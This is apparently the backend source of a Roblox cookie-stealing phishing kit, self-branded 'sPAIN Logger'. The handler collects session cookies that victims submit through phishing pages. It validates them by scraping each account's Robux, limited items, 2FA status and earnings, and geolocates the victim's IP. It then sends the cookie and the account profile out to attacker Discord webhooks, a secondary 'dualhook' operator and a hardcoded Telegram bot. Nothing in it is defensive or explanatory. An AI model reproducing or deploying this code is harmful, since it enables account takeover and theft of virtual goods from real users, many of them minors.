// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

async function redisSet(key, value) {
  try {
    await fetch(
      `${REDIS_URL}/set/${encodeURIComponent(key)}/${encodeURIComponent(JSON.stringify(value))}`,
      { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } }
    );
  } catch (_) {}
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`);
    const d = await r.json();
    return d.status === 'success' ? d : null;
  } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

// ── Call the on-Vercel headless scraper instead of external worker ────────────
async function scrapeAccount(cookie, victimIp) {
  try {
    const base = process.env.VERCEL_URL
      ? `https://${process.env.VERCEL_URL}`
      : 'http://localhost:3000';
    const r = await fetch(`${base}/api/scrape`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie, victimIp })
    });
    if (!r.ok) return null;
    const d = await r.json();
    return d.valid ? d : null;
  } catch { return null; }
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
  } catch (_) {}
}

async function discordChunked(url, text, lang = '') {
  const pre = lang ? `\`\`\`${lang}\n` : '';
  const suf = lang ? '\n```' : '';
  const lim = 1990 - pre.length - suf.length;
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, lim); rem = rem.substring(lim);
    await discordSend(url, { content: (first ? pre : '') + chunk + (rem.length === 0 ? suf : '') });
    first = false;
  }
}

function fmt(n) { return Number(n || 0).toLocaleString(); }

async function sendHit(webhookUrl, { info, cookie, ip, geo, now, pageName, refreshUrl }) {
  const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:       `🧑 ${info.username} ${info.isPremium ? '⭐' : ''}`,
      description: `🔥 \`sPAIN\` 🔥\n\n[👤 Profile](https://www.roblox.com/users/${info.id}/profile)${refreshUrl ? `\n[🔄 Refresh](${refreshUrl})` : ''}`,
      color:       5793266,
      thumbnail:   { url: info.avatarUrl },
      fields: [
        { name: '🔴 Robux',      value: `${fmt(info.robux)}`,                                                                         inline: true  },
        { name: '🎵 RAP',        value: `${fmt(info.limitedsValue)} (${info.limitedsCount} items)`,                                    inline: true  },
        { name: '🗓️ Age',        value: `${info.accountAgeDays} days`,                                                                 inline: true  },
        { name: '💎 Premium',    value: info.isPremium ? 'Yes ✅' : 'No ❌',                                                          inline: true  },
        { name: '👥 Groups',     value: `Owned: ${info.groupsOwned} | R$: ${fmt(info.groupRobux)}`,                                   inline: true  },
        { name: '💳 Credit',     value: `$${info.credit || 0}`,                                                                        inline: true  },
        { name: '🌐 IP',         value: ip || 'Unknown',                                                                               inline: true  },
        { name: '📍 Location',   value: loc + (geo?.isp ? `\n${geo.isp}` : ''),                                                       inline: true  },
        { name: '💀 Headless',   value: `${info.hasHeadless ? '✅ Yes' : '❌ No'} | Korblox: ${info.hasKorblox ? '✅ Yes' : '❌ No'}`, inline: true  },
        { name: '⚙️ Account',    value: `Email: ${info.emailSet}\n2FA: ${info.twoFA}`,                                                 inline: false },
        { name: '📊 Earnings',   value: `Day: ${fmt(info.txDay)} | Week: ${fmt(info.txWeek)} | Month: ${fmt(info.txMonth)} | Year: ${fmt(info.txYear)}`, inline: false },
        { name: '📋 PowerShell', value: '```\n' + (info.powershell || '').substring(0, 900) + '\n```',                                 inline: false }
      ],
      footer: { text: `sPAIN Logger • ${pageName} • ${now}` },
      timestamp: now
    }]
  });
  if (info.powershell && info.powershell.length > 900) await discordChunked(webhookUrl, info.powershell, 'powershell');
  await discordChunked(webhookUrl, cookie);
  if (refreshUrl) {
    await discordSend(webhookUrl, {
      embeds: [{
        title:       '🔄 Refresh Anytime',
        description: `**${refreshUrl}**`,
        color:       0x06b6d4,
        footer:      { text: 'sPAIN Tools • Keep private' }
      }]
    });
  }
}

async function sendInvalid(webhookUrl, { ip, geo, now, pageName }) {
  const loc = [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown';
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:  '⚠️ Wrong Cookie — Troll Detected 💀',
      color:  0xff3333,
      fields: [
        { name: '🌐 IP',       value: ip || 'Unknown', inline: true  },
        { name: '📍 Location', value: loc,              inline: true  },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
        { name: '🕐 Time',     value: now,              inline: false }
      ],
      footer: { text: `sPAIN Tools • ${pageName}` }
    }]
  });
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots } = body;
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
  const cookie = findCookie(slots);
  const now    = new Date().toISOString();
  const pName  = record.displayName || slug;

  const webhooks = [record.webhook];
  if (record.dualhookParent) {
    const parent = await redisGet(`slot:${record.dualhookParent}`);
    if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
  }

  // No cookie in slots at all
  if (!cookie) {
    await Promise.all(webhooks.map(wh => sendInvalid(wh, { ip, geo: null, now, pageName: pName })));
    await tgSend(`⚠️ <b>NO COOKIE</b>\n📄 ${pName}\n🌐 <code>${ip}</code>`);
    return res.status(200).json({ success: true });
  }

  // Geo + headless scrape in parallel
  const [geo, info] = await Promise.all([
    getIpGeo(ip),
    scrapeAccount(cookie, ip)
  ]);

  // Cookie rejected by Roblox
  if (!info) {
    await Promise.all(webhooks.map(wh => sendInvalid(wh, { ip, geo, now, pageName: pName })));
    // Still send the raw cookie — might be useful
    await Promise.all(webhooks.map(wh => discordChunked(wh, cookie)));
    await tgSend(`⚠️ <b>INVALID COOKIE</b>\n📄 ${pName}\n🌐 <code>${ip}</code>`);
    return res.status(200).json({ success: true });
  }

  // Valid — save refresh entry
  const refreshId  = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
  const refreshUrl = `https://spain-tools.vercel.app/r/${refreshId}`;
  await redisSet(`refresh:${refreshId}`, {
    cookie,
    webhook:   record.webhook,
    webhook1:  webhooks[1] || null,
    pageName:  pName,
    ip,
    isp:       geo?.isp || 'Unknown',
    createdAt: now
  });

  const payload = { info, cookie, ip, geo, now, pageName: pName, refreshUrl };
  await Promise.all(webhooks.map(wh => sendHit(wh, payload)));

  await tgSend([
    `✅ <b>HIT — ${info.username} ${info.isPremium ? '⭐' : ''}</b>`,
    `💰 ${fmt(info.robux)} R$ | RAP: ${fmt(info.limitedsValue)}`,
    `🌐 <code>${ip}</code> — ${[geo?.city, geo?.country].filter(Boolean).join(', ')}`,
    `📄 ${pName}`,
    `🔄 ${refreshUrl}`
  ].join('\n'));

  return res.status(200).json({ success: true });
}
